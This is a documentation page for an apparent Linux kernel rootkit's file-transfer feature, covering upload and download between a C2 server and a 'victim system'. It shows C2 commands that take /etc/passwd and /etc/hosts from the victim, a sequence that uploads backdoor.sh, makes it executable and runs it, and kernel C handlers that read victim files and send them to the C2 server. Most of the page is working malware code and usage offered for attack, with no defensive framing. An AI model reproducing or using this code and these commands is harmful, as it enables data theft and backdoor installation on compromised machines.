---
title: "File Transfer"
description: "Upload and download files between C2 server and victim system"
icon: "file-transfer"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 52
---

# File Transfer

Transfer files between the C2 server and victim system using direct content transmission.

## How It Works

### Upload Process
1. **C2 reads local file** and sends content
2. **Rootkit receives** filename and content
3. **Creates file** on victim system using `filp_open()`
4. **Writes content** using `kernel_write()`

### Download Process
1. **C2 requests file** by path
2. **Rootkit opens file** using `filp_open()`
3. **Reads content** using `kernel_read()`
4. **Sends content** back to C2 server

## Upload Feature

### Basic Usage
```bash
# Upload file to specific path
c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
# ✓ File uploaded successfully (1024 bytes)

# Upload to current directory (uses basename)
c2-server$ upload Client-1 ./script.sh
# ✓ File uploaded successfully (512 bytes) -> ./script.sh
```


### Implementation Details
- **File creation**: Uses `O_WRONLY | O_CREAT | O_TRUNC` flags
- **Permissions**: Files created with 0644 permissions
- **Size limits**: 10MB maximum file size

## Download Feature

### Basic Usage
```bash
# Download to specific local path
c2-server$ download Client-1 /etc/passwd ./victim_passwd
# ✓ File downloaded successfully (2048 bytes)

# Download to current directory (uses basename)
c2-server$ download Client-1 /etc/hostname
# ✓ File downloaded successfully (64 bytes) -> ./hostname
```


## Real Examples

### System Files
```bash
# Download system configuration
c2-server$ download Client-1 /etc/passwd
# ✓ File downloaded successfully (2048 bytes)
# Content: root:x:0:0:root:/root:/bin/bash
#          daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#          ...

# Download network configuration
c2-server$ download Client-1 /etc/hosts
# ✓ File downloaded successfully (256 bytes)
# Content: 127.0.0.1	localhost
#          127.0.1.1	victim
#          ...
```


### Upload Scripts
```bash
# Upload a shell script
c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
# ✓ File uploaded successfully (1024 bytes)

# Make it executable (via exec command)
c2-server$ exec Client-1 chmod +x /tmp/backdoor.sh
# Exit code: 0

# Run the script
c2-server$ exec Client-1 /tmp/backdoor.sh
# Exit code: 0
# Output: Backdoor installed successfully
```


## Technical Implementation

### Upload Handler
```c
static int handle_upload(const char *data)
{
    char *filename, *file_content, *separator;
    struct file *file;
    loff_t pos = 0;
    ssize_t bytes_written;
    
    // Parse filename:content format
    separator = strchr(data, ':');
    *separator = '\0';
    filename = data;
    file_content = separator + 1;
    
    // Validate filename
    if (!validate_filename(filename))
        return send_error("Invalid or unsafe filename");
    
    // Create and write file
    file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    bytes_written = kernel_write(file, file_content, content_length, &pos);
    filp_close(file, NULL);
    
    return send_success("File uploaded successfully");
}
```

### Download Handler
```c
static int handle_download(const char *data)
{
    struct file *file;
    loff_t file_size, pos = 0;
    char *file_content, *result_buffer;
    ssize_t bytes_read;
    
    // Open file
    file = filp_open(data, O_RDONLY, 0);
    if (IS_ERR(file))
        return send_error("File not found or cannot be opened");
    
    // Check file size
    file_size = i_size_read(file_inode(file));
    if (file_size > MAX_FILE_SIZE) {
        filp_close(file, NULL);
        return send_error("File too large to download");
    }
    
    // Read file content
    file_content = vmalloc(file_size + 1);
    bytes_read = kernel_read(file, file_content, file_size, &pos);
    file_content[bytes_read] = '\0';
    
    // Format response
    result_buffer = vmalloc(file_size + 32);
    snprintf(result_buffer, file_size + 32, "DOWNLOAD:%s", file_content);
    
    return send_result(result_buffer);
}
```

## Configuration

```c
// rootkit/core/config.h
#define MAX_FILE_SIZE (10 * 1024 * 1024)  // 10MB
#define MAX_FILENAME_LENGTH 255
```